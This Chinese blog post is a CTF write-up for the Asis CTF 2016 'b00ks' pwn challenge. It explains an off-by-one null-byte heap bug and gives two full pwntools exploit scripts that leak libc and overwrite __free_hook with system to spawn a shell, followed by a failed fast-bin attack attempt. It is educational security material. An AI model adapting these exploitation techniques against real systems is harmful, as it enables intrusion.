<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Asis CTF 2016 - b00ks —— Off-By-One利用与思考 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Asis CTF 2016 - b00ks —— Off-By-One利用与思考</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-09-12T15:57:14.000Z" id="date"> 2021-09-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:34.984Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>      这道题做得有点痛苦……因为本地通常都很难和服务器有相同的环境，使用mmap开辟空间造成的偏移会因此而变得麻烦，并且free_hook周围很难伪造chunk，一度陷入恐慌……</p>
<p>        不过本来应该很早就开始Off-By-One的学习的，竟然现在才注意到……惭愧</p>
<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>        book结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct book<br>&#123;<br>    int id;<br>    char *name;<br>    char *description;<br>    int size;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/a7aab0c9-46e9-4bff-9a26-6bf632e02107'><img src="blob:https://tokameine.top/a7aab0c9-46e9-4bff-9a26-6bf632e02107"></p>
<p>        程序具体的流程不做赘述，主要漏洞点出在sub_9F5函数中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall sub_9F5(_BYTE *a1, int a2)<br>&#123;<br>  int i; // [rsp+14h] [rbp-Ch]<br><br>  if ( a2 &lt;= 0 )<br>    return 0LL;<br>  for ( i = 0; ; ++i )<br>  &#123;<br>    if ( read(0, a1, 1uLL) != 1 )<br>      return 1LL;<br>    if ( *a1 == &#x27;\n&#x27; )<br>      break;<br>    ++a1;<br>    if ( i == a2 )<br>      break;<br>  &#125;<br>  *a1 = 0;<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/dbdcb751-c75e-4226-a6e6-c0a8899d9b85'><img src="blob:https://tokameine.top/dbdcb751-c75e-4226-a6e6-c0a8899d9b85"></p>
<p>         i是从0开始计数的，假设输入a2&#x3D;32，那么将会通过read读取32个字符，而在++a1之后，让第33个字符的位置被“\x00”覆盖，从而造成该漏洞</p>
<h3 id="第一种方法：mmap拓展"><a href="#第一种方法：mmap拓展" class="headerlink" title="第一种方法：mmap拓展"></a>第一种方法：mmap拓展</h3><p>        该方法实用性似乎不是很高，主要的利用思路是：<strong>mmap开辟出的块与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能通过一个“固定的偏移”得到libc</strong></p>
<p>        但这个偏移会因为不同的系统、不同的libc版本种种原因而发生偏差</p>
<p>        笔者使用Ubuntu16的系统得出偏移后，成功在本地拿到了shell，但服务器那边却没能成功</p>
<p>        也试着从其他师傅的wp里获取，但似乎因为BUU过去的系统升级等原因，那些偏移也没能成功，最后使用的是第二种方法拿到了服务端的shell，但其方法还是值得学习的，并且主要的思路同第二种方法是相同的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o<br>.data:0000000000202010                                         ; sub_BBD:loc_C1B↑o ...<br>.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: sub_B6D+15↑o<br>.data:0000000000202018                                         ; sub_D1F+CA↑o<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/50a879e7-55d2-43de-8994-5a4937c7753c'><img src="blob:https://tokameine.top/50a879e7-55d2-43de-8994-5a4937c7753c"></p>
<p>         IDA中可以看见名字与书的地址分布</p>
<p>        二者相距很近，name为unk_202040，而book结构的的地址为unk_202060，因此，如果名字长达32字节，就能够泄露出第一个book结构的地址</p>
<p>        同时，也因为上面所说的Off-By-One漏洞，我们甚至能将该book结构的最后一位置0</p>
<p>        因此如果这样去设定：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">createname(&quot;a&quot;*32)<br>createbook(0xD0,&quot;object1&quot;,0x20,&quot;object2&quot;)<br>createbook(0x21000, &#x27;/bin/sh&#x27;, 0x21000, &#x27;/bin/sh&#x27;)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/9584ae91-e19c-48d7-99a9-b06d8d9c1100'><img src="blob:https://tokameine.top/9584ae91-e19c-48d7-99a9-b06d8d9c1100"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ x /10gx 0x55da227e6040<br>0x55da227e6040:0x61616161616161610x6161616161616161<br>0x55da227e6050:0x61616161616161610x6161616161616161<br>0x55da227e6060:0x000055da231941300x000055da23194160<br>0x55da227e6070:0x00000000000000000x0000000000000000<br>0x55da227e6080:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/95a6a2ff-f26c-4030-865d-7a7d59163ba3'><img src="blob:https://tokameine.top/95a6a2ff-f26c-4030-865d-7a7d59163ba3"></p>
<p>         接下来如果我们打印出内容，就会把地址0x000055da23194130泄露出来</p>
<p>        并且，因为堆的初始化是按页对齐的，而该程序的生成规律是：name——&gt;des——&gt;book</p>
<p>        因此，设计好每个chunk的大小，那么当我们覆盖book的最后一个字节时，就能让其指向des</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ x /10gx 0x000055da23194130<br>0x55da23194130:0x00000000000000010x000055da23194020<br>0x55da23194140:0x000055da231941000x0000000000000020<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/7855a895-4472-440b-b7da-e5ee137e0618'><img src="blob:https://tokameine.top/7855a895-4472-440b-b7da-e5ee137e0618"></p>
<p>        0x000055da23194100即为des，和book结构地址只有最低位不同</p>
<p>        而des结构是我们可以任意写的，如果我们将其伪造成book结构，让这个fake book的des指向我们想要写的位置，那么我们就能达成任意地址写了</p>
<p>        但话虽如此，我们还不知道应该往哪写</p>
<p>        基本的想法是覆盖__free_hook或者__malloc_hook为system或one gadget</p>
<p>        那么我们还需要泄露libc基址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">book1_addr = u64(book_author[32:32+6].ljust(8,&#x27;\x00&#x27;))<br>log.success(&quot;book1_address:&quot; + hex(book1_addr))<br><br>payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)<br>editbook(book_id_1, payload)<br>changename(&quot;a&quot;*32)<br><br>book_id_2, book_name_2, book_des_2, book_author_2 = printbook(1)<br>leak_addr=u64(book_name_2.ljust(8,&#x27;\x00&#x27;))<br>log.success(&quot;leak_addr:&quot; + hex(leak_addr)) # [+] leak_addr:0x7f5e8d2c4010<br>libc_base=leak_addr+ (0x00007f5e8cd12000 - 0x7f5e8d2c4010)<br>log.success(&quot;libc_base:&quot; + hex(libc_base))<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/37d4695a-0486-457e-8844-fc3a2495a231'><img src="blob:https://tokameine.top/37d4695a-0486-457e-8844-fc3a2495a231"></p>
<p>         我们可以根据堆的开辟顺序得到book2的地址，然后将book1的name和des指向book2的name和des</p>
<p>        此时如果再打印所有book，book1的name就会泄露出book而name块的地址，而name块是通过mmap开辟而来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x00007f5e8cd12000 0x00007f5e8ced2000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007f5e8ced2000 0x00007f5e8d0d2000 ---p/lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007f5e8d0d2000 0x00007f5e8d0d6000 r--p/lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007f5e8d0d6000 0x00007f5e8d0d8000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007f5e8d0d8000 0x00007f5e8d0dc000 rw-pmapped<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/a2645c0b-e32a-43c0-84f3-5e7b31162fa2'><img src="blob:https://tokameine.top/a2645c0b-e32a-43c0-84f3-5e7b31162fa2"></p>
<p>        最后只需要将__free_hook写为system，然后把book2删除即可拿到shell</p>
<p>        因为此时book1的des指向book2的des处，将该处改为__free_hook地址，那么写book2的des时就会往__free_hook处写入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">system=libc_base+libc.symbols[&#x27;system&#x27;]<br>free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]<br>payload=p64(free_hook)<br>editbook(1, payload)<br>payload=p64(system)<br>editbook(2, payload)<br><br>deletebook(2)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/c912ae64-c372-4c4e-bb7e-78f5f6a39fdd'><img src="blob:https://tokameine.top/c912ae64-c372-4c4e-bb7e-78f5f6a39fdd"></p>
<p>       完整exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br><br>context.log_level = &#x27;info&#x27;<br>binary = ELF(&quot;b00ks&quot;)<br>libc=binary.libc<br>io = process(&quot;./b00ks&quot;)<br><br>def createbook(name_size, name, des_size, des):<br>    io.readuntil(&quot;&gt; &quot;)<br>    io.sendline(&quot;1&quot;)<br>    io.readuntil(&quot;: &quot;)<br>    io.sendline(str(name_size))<br>    io.readuntil(&quot;: &quot;)<br>    io.sendline(name)<br>    io.readuntil(&quot;: &quot;)<br>    io.sendline(str(des_size))<br>    io.readuntil(&quot;: &quot;)<br>    io.sendline(des)<br><br>def printbook(id):<br>    io.readuntil(&quot;&gt; &quot;)<br>    io.sendline(&quot;4&quot;)<br>    io.readuntil(&quot;: &quot;)<br>    for i in range(id):<br>        book_id = int(io.readline()[:-1])<br>        io.readuntil(&quot;: &quot;)<br>        book_name = io.readline()[:-1]<br>        io.readuntil(&quot;: &quot;)<br>        book_des = io.readline()[:-1]<br>        io.readuntil(&quot;: &quot;)<br>        book_author = io.readline()[:-1]<br>    return book_id, book_name, book_des, book_author<br><br>def createname(name):<br>    io.readuntil(&quot;name: &quot;)<br>    io.sendline(name)<br><br>def changename(name):<br>    io.readuntil(&quot;&gt; &quot;)<br>    io.sendline(&quot;5&quot;)<br>    io.readuntil(&quot;: &quot;)<br>    io.sendline(name)<br><br>def editbook(book_id, new_des):<br>    io.readuntil(&quot;&gt; &quot;)<br>    io.sendline(&quot;3&quot;)<br>    io.readuntil(&quot;: &quot;)<br>    io.writeline(str(book_id))<br>    io.readuntil(&quot;: &quot;)<br>    io.sendline(new_des)<br><br>def deletebook(book_id):<br>    io.readuntil(&quot;&gt; &quot;)<br>    io.sendline(&quot;2&quot;)<br>    io.readuntil(&quot;: &quot;)<br>    io.sendline(str(book_id))<br><br>createname(&quot;a&quot;*32)<br>createbook(0xD0,&quot;object1&quot;,0x20,&quot;object2&quot;)<br>createbook(0x21000, &#x27;/bin/sh&#x27;, 0x21000, &#x27;/bin/sh&#x27;)<br><br>book_id_1, book_name, book_des, book_author = printbook(1)<br><br>book1_addr = u64(book_author[32:32+6].ljust(8,&#x27;\x00&#x27;))<br>log.success(&quot;book1_address:&quot; + hex(book1_addr))<br><br>payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)<br>editbook(book_id_1, payload)<br>changename(&quot;a&quot;*32)<br><br>book_id_2, book_name_2, book_des_2, book_author_2 = printbook(1)<br>leak_addr=u64(book_name_2.ljust(8,&#x27;\x00&#x27;))<br>log.success(&quot;leak_addr:&quot; + hex(leak_addr))<br><br>libc_base=leak_addr+ (0x00007f5e8cd12000 - 0x7f5e8d2c4010)<br>log.success(&quot;libc_base:&quot; + hex(libc_base))<br><br>system=libc_base+libc.symbols[&#x27;system&#x27;]<br>free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]<br><br>payload=p64(free_hook)<br>editbook(1, payload)<br><br>payload=p64(system)<br>editbook(2, payload)<br><br>deletebook(2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>         这是本地能够通过的方法，但受限于不能拿到服务端那边的偏移，所以只能在本地通过</p>
<h3 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h3><p>        另外一种泄露方式，也是笔者成功在服务端那边打通的exp</p>
<p>        其泄露libc基址的方法与第一种不同，通过unsorted bin中的fd指针泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">p.sendlineafter(&#x27;name: &#x27;,&#x27;a&#x27;*0x1f+&#x27;b&#x27;)<br>add(0xd0,&#x27;aaaaaaaa&#x27;,0x20,&#x27;bbbbbbbb&#x27;)<br>show()<br>p.recvuntil(&#x27;aaab&#x27;)<br>heap_addr = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))<br>print &#x27;heap_addr--&gt;&#x27;+hex(heap_addr)<br>add(0x80,&#x27;cccccccc&#x27;,0x60,&#x27;dddddddd&#x27;)<br>add(0x10,&#x27;/bin/sh&#x27;,0x10,&#x27;/bin/sh&#x27;)<br>delete(2)<br><br>edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90)+p64(0x20))<br>change(&#x27;a&#x27;*0x20)<br>show()<br><br>libc_base = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-88-0x10-libc.symbols[&#x27;__malloc_hook&#x27;]<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/7346dc27-1e54-4aa1-bb56-872ce152fe66'><img src="blob:https://tokameine.top/7346dc27-1e54-4aa1-bb56-872ce152fe66"></p>
<p>         同样的方法泄露book1的地址，然后伪造book结构</p>
<p>        其中，heap_addr+0x30这个地址将会指向被删除的book2处的fd指针地址，由此泄露libc基址</p>
<p>        这种方法泄露的地址不依赖于系统，arena的基址有固定的计算方式，使用常规的2.23版本libc即可拿到正确基址（虽然本题没有提供libc，但BUU里大多2.23的libc都是同一个，直接拿过来用就行了）</p>
<p>        参考文章中，“不会修电脑”师傅是通过FastBin Attack来拿shell，但笔者这里还是同第一种方法一样，直接复写__free_hook即可</p>
<p>        完整exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br><br>#p=remote(&quot;node4.buuoj.cn&quot;,26109)<br>p = process([&#x27;./b00ks&#x27;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)<br><br>elf = ELF(&#x27;./b00ks&#x27;)<br>libc = ELF(&quot;./libc.so.6&quot;)<br>context.log_level = &#x27;info&#x27;<br><br><br>def add(name_size,name,content_size,content):<br>    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)<br>    p.sendlineafter(&#x27;size: &#x27;,str(name_size))<br>    p.sendlineafter(&#x27;chars): &#x27;,name)<br>    p.sendlineafter(&#x27;size: &#x27;,str(content_size))<br>    p.sendlineafter(&#x27;tion: &#x27;,content)<br>def delete(index):<br>    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)<br>    p.sendlineafter(&#x27;delete: &#x27;,str(index))<br>def edit(index,content):<br>    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)<br>    p.sendlineafter(&#x27;edit: &#x27;,str(index))<br>    p.sendlineafter(&#x27;ption: &#x27;,content)<br>def show():<br>    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)<br>def change(author_name):<br>    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)<br>    p.sendlineafter(&#x27;name: &#x27;,author_name)<br><br>p.sendlineafter(&#x27;name: &#x27;,&#x27;a&#x27;*0x1f+&#x27;b&#x27;)<br>add(0xd0,&#x27;aaaaaaaa&#x27;,0x20,&#x27;bbbbbbbb&#x27;)<br>show()<br>p.recvuntil(&#x27;aaab&#x27;)<br>heap_addr = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))<br>print &#x27;heap_addr--&gt;&#x27;+hex(heap_addr)<br>add(0x80,&#x27;cccccccc&#x27;,0x60,&#x27;dddddddd&#x27;)<br>add(0x20,&#x27;/bin/sh&#x27;,0x20,&#x27;/bin/sh&#x27;)<br>delete(2)<br><br>edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x180+0x50)+p64(0x20))<br>change(&#x27;a&#x27;*0x20)<br>show()<br><br>libc_base = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-88-0x10-libc.symbols[&#x27;__malloc_hook&#x27;]<br>__malloc_hook = libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]<br>realloc = libc_base+libc.symbols[&#x27;realloc&#x27;]<br><br><br>print &#x27;libc_base--&gt;&#x27;+hex(libc_base)<br>__free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]<br>system=libc_base+libc.symbols[&#x27;system&#x27;]<br><br>edit(1,p64(__free_hook)+&#x27;\x00&#x27;*2+&#x27;\x20&#x27;)<br><br>print &#x27;__free_hook--&gt;&#x27;+hex(__free_hook)<br><br>edit(3,p64(system))<br>delete(3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/11c77dc0-fcc1-4ba2-93a1-dde7ee23d32e'><img src="blob:https://tokameine.top/11c77dc0-fcc1-4ba2-93a1-dde7ee23d32e"></p>
<p>​</p>
<h3 id="第三法："><a href="#第三法：" class="headerlink" title="第三法："></a>第三法：</h3><p>         这里是指通过Fast Bin Attack来写hook</p>
<p>        但这种方法通常都很难精确地覆写，只能在目标附近寻址合适的位置伪造chunk</p>
<p>        笔者在尝试该方法时遇到了比较特别的问题，特此记录一下</p>
<p>        首先需要泄露libc基址，泄露方法同第二种方法完全一样，通过fd指针拿到了libc base，此时的bins内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fastbins<br>0x20: 0x0<br>0x30: 0x55a691fe2250 ◂— 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x55a691fe21e0 ◂— 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x55a691fe2150 —▸ 0x7fc45e171b78 (main_arena+88) ◂— 0x55a691fe2150<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/f4b174ea-d2d8-4cc5-8f97-0b4c5dc7fd21'><img src="blob:https://tokameine.top/f4b174ea-d2d8-4cc5-8f97-0b4c5dc7fd21"></p>
<p>        留意下述的地址，我们是能够在__free_hook周围找到一个能够用以伪造chunk的位置的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ p &amp;__free_hook<br>$1 = (void (**)(void *, const void *)) 0x7fc45e1737a8 &lt;__free_hook&gt;<br>gdb-peda$ x /10gx 0x7fc45e1737a8-0x13<br>0x7fc45e173795 &lt;_IO_stdfile_0_lock+5&gt;:0xc45e3827000000000x000000000000007f<br>0x7fc45e1737a5 &lt;__after_morecore_hook+5&gt;:0x00000000000000000x0000000000000000<br>0x7fc45e1737b5 &lt;__malloc_initialize_hook+5&gt;:0x00000000000000000x0000000000000000<br>0x7fc45e1737c5 &lt;narenas_limit.11257+5&gt;:0x00000000000000000x0000000000000000<br>0x7fc45e1737d5 &lt;aligned_heap_area+5&gt;:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/99ac35c9-3485-4134-80d5-6b6feeaa922f'><img src="blob:https://tokameine.top/99ac35c9-3485-4134-80d5-6b6feeaa922f"></p>
<p>         那么，我们的目标就是将0x70: 0x55a691fe21e0的fd指向0x7fc45e1737a8-0x13就能成功伪造了，然后覆盖__free_hook为system即可</p>
<p> <strong>但笔者经过测试之后发现，这种方法是不可行的</strong></p>
<p>        尽管此刻，我们能够找到合适的位置伪造chunk，但当我们成功使用edit功能复写之后，这里将会被置零</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fastbins<br>0x20: 0x0<br>0x30: 0x55a691fe2250 ◂— 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x55a691fe21e0 —▸ 0x7fc45e173795 &lt;_IO_stdfile_0_lock+5&gt; ◂— 0xc45de32ea0000000<br>0x80: 0x0<br>unsortedbin<br>all: 0x55a691fe2150 —▸ 0x7fc45e171b78 (main_arena+88) ◂— 0x55a691fe2150<br></code></pre></td></tr></table></figure>

